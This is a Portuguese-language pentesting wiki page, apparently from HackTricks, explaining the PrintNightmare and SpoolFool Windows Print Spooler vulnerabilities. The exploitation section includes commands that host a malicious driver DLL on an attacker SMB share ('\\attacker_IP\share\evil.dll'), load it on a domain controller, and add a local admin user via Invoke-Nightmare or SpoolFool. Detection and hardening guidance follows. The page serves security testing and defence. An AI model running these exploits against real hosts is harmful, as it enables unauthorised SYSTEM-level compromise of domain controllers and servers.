# PrintNightmare (RCE/LPE do Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare é o nome coletivo dado a uma família de vulnerabilidades no serviço **Print Spooler** do Windows que permitem **execução arbitrária de código como SYSTEM** e, quando o spooler está acessível por RPC, **execução remota de código (RCE) em controladores de domínio e servidores de arquivos**. As CVEs mais exploradas são **CVE-2021-1675** (classificada inicialmente como LPE) e **CVE-2021-34527** (RCE completa). Problemas posteriores, como **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)**, comprovam que a superfície de ataque ainda está longe de estar fechada.

Se você está procurando por **coerção de autenticação / relay** por meio do spooler, em vez de **RCE/LPE baseada em driver**, confira [esta outra página sobre abuso de coerção de impressoras](printers-spooler-service-abuse.md). Esta página se concentra em **carregar drivers / DLLs como SYSTEM**.

---

## 1. Componentes vulneráveis e CVEs

| Ano | CVE | Nome curto | Primitiva | Observações |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corrigida na CU de junho de 2021, mas contornada pela CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` permite que usuários autenticados carreguem uma DLL de driver de um compartilhamento remoto; após agosto de 2021, isso geralmente exige políticas de Point & Print enfraquecidas|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalação de drivers não assinados por usuários que não são administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Criação arbitrária de diretórios → plantio de DLL – funciona após as correções de 2021|

Todas elas abusam de um dos **métodos RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou de relações de confiança dentro do **Point & Print**.

## 2. Técnicas de exploração

### 2.1 Comprometimento remoto de controlador de domínio (CVE-2021-34527)

Um usuário de domínio **não privilegiado**, mas autenticado, pode executar DLLs arbitrárias como **NT AUTHORITY\SYSTEM** em um spooler remoto (geralmente o DC) por meio de:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

PoCs populares incluem **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e os módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy no **mimikatz**.

### 2.2 Escalonamento local de privilégios (qualquer versão compatível do Windows, 2021-2024)

A mesma API pode ser chamada **localmente** para carregar um driver de `C:\Windows\System32\spool\drivers\x64\3\` e obter privilégios SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Triagem moderna em hosts com patches

Em um host totalmente atualizado, os PoCs públicos do PrintNightmare geralmente falham porque o Windows agora restringe por padrão a instalação de drivers de impressora a administradores (`RestrictDriverInstallationToAdministrators=1`, desde 10 de agosto de 2021). Antes de lançar um exploit contra um alvo, verifique primeiro se o ambiente reverteu essa medida de segurança para implantações legadas de impressoras:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Os dois valores fracos mais interessantes geralmente são:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

No Linux, confirme rapidamente que o alvo expõe as interfaces RPC de impressão relevantes antes de executar um PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Algumas ferramentas públicas mais recentes também oferecem um fluxo de trabalho mais seguro de **verificação/listagem** antes de enviar uma DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Se você receber `RPC_E_ACCESS_DENIED` (`0x8001011b`) como um usuário com poucos privilégios, geralmente está vendo o comportamento padrão pós-2021, e não uma falha de transporte.

> No Windows 11 22H2+ e em builds de cliente mais recentes, a impressão remota usa **RPC over TCP** por padrão, e **RPC over named pipes** (`\PIPE\spoolss`) fica desabilitado, a menos que seja reabilitado explicitamente. Alguns PoCs antigos e anotações de laboratório ainda presumem que o named pipe está acessível.<sup>[[4]](#references)</sup>

### 2.4 Abuso de Package Point & Print em redes “corrigidas”

Muitos ambientes corporativos continuaram **vulneráveis por política** após os patches originais de 2021, porque os fluxos de trabalho do helpdesk ou do servidor de impressão ainda exigiam que usuários sem privilégios de administrador instalassem/atualizassem drivers. Na prática, o playbook ofensivo passa a ser:

- Se os avisos de segurança estiverem totalmente desabilitados, **o PrintNightmare clássico com DLL arbitrária** ainda é o caminho mais curto.
- Se `Only use Package Point and Print` estiver habilitado, geralmente é necessário pivotar para um caminho que use um **driver assinado compatível com pacotes**, em vez de simplesmente soltar uma DLL.<sup>[[3]](#references)</sup>
- Pesquisas de 2024 mostraram que **`Package Point and Print - Approved servers` não é, por si só, um limite de confiança rígido**: se um atacante puder falsificar ou sequestrar a resolução de nomes de um servidor de impressão aprovado, as vítimas ainda poderão ser redirecionadas para um servidor malicioso que satisfaça as verificações de política.<sup>[[4]](#references)</sup>
- Mesmo combinar o endurecimento de UNC com RPC-over-SMB forçado pode ser instável, pois clientes modernos podem **recorrer a RPC over TCP**.<sup>[[4]](#references)</sup>

Por isso, a exploração moderna no estilo PrintNightmare costuma estar mais relacionada a **abusar da política corporativa de implantação de impressoras** do que a repetir sem alterações o PoC original de 2021.

### 2.5 SpoolFool (CVE-2022-21999) – contornando as correções de 2021

Os patches da Microsoft de 2021 bloquearam o carregamento remoto de drivers, mas **não reforçaram as permissões de diretório**. O SpoolFool abusa do parâmetro `SpoolDirectory` para criar um diretório arbitrário em `C:\Windows\System32\spool\drivers\`, solta uma DLL de payload e força o spooler a carregá-la:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> O exploit funciona em sistemas Windows 7 → Windows 11 e Server 2012R2 → 2022 totalmente corrigidos antes das atualizações de fevereiro de 2022<sup>[[2]](#references)</sup>

---

## 3. Detecção e hunting

* **Logs do PrintService** – habilite o canal *Microsoft-Windows-PrintService/Operational* e monitore o **Event ID 316** (driver adicionado/atualizado, geralmente inclui os nomes das DLLs) em tentativas bem-sucedidas e malsucedidas. Combine-o com o **Event ID 808/811** para identificar falhas suspeitas ao carregar módulos/drivers do spooler.
* **Sysmon** – `Event ID 7` (imagem carregada) ou `11/23` (gravação/exclusão de arquivo) dentro de `C:\Windows\System32\spool\drivers\*` quando o processo pai for **spoolsv.exe**.
* **Linhagem de processos** – gere um alerta sempre que **spoolsv.exe** iniciar `cmd.exe`, `rundll32.exe`, PowerShell ou qualquer processo filho inesperado e sem assinatura.
* **Telemetria de rede** – buscas SMB inesperadas de `spoolsv.exe` em compartilhamentos controlados por atacantes ou tráfego RPC de impressora incomum em servidores que não deveriam atuar como servidores de impressão são ambos indícios de alta confiança.

## 4. Mitigação e hardening

1. **Aplique patches!** – Instale a atualização cumulativa mais recente em todos os hosts Windows que tenham o serviço Print Spooler instalado.
2. **Desabilite o spooler onde ele não for necessário**, especialmente em Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Bloqueie conexões remotas** e ainda permita a impressão local – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantenha o Point & Print restrito aos administradores** definindo:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Orientações detalhadas na Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Se os requisitos de negócio exigirem `RestrictDriverInstallationToAdministrators=0`, trate todas as outras políticas de impressora apenas como **mitigações parciais**. No mínimo, prefira **drivers compatíveis com pacotes**, habilite **Only use Package Point and Print** e restrinja **Package Point and Print - Approved servers** a servidores de impressão explícitos dentro da floresta.<sup>[[3]](#references)</sup>
6. **Não reverta a privacidade RPC da impressora** apenas para corrigir mapeamentos de impressora com problemas. Ambientes que definem `RpcAuthnLevelPrivacyEnabled=0` estão desfazendo o hardening introduzido para **CVE-2021-1678** e geralmente merecem análise adicional durante um engagement.<sup>[[4]](#references)</sup>

---

## 5. Pesquisas e ferramentas relacionadas

* Módulos [`mimikatz` `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementação padrão do Impacket com os modos `-check`, `-list` e `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper com entrega SMB integrada, suporte a vários alvos e modos `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuso de driver de impressora vulnerável próprio por meio do package Point & Print
* Exploit e análise do SpoolFool
* Micropatches do 0patch para o SpoolFool e outros bugs do spooler

Se quiser **forçar a autenticação** por meio do spooler em vez de carregar um driver, vá para [abuso do serviço de spooler de impressão](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Gerenciar o novo comportamento padrão de instalação de drivers do Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Um guia prático do PrintNightmare em 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – O PrintNightmare ainda não acabou](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
